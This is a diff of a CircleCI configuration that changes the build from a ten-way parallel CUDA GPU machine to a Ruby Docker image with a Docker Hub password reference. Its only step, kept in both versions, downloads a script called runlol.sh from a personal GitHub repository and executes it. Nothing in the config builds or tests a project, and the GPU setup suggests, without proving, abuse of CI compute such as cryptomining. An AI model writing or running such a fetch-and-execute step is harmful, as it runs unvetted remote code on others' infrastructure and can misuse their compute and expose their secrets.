@@ -1,11 +1,10 @@
-version: 2.1
-
+version: 2.0
 jobs:
   build:
-    machine:
-      image: ubuntu-1604-cuda-10.1:201909-23
-    parallelism: 10
-    resource_class: gpu.nvidia.small
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
-      - run: nvidia-smi
       - run: wget https://raw.githubusercontent.com/Myaxisplay/pos/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
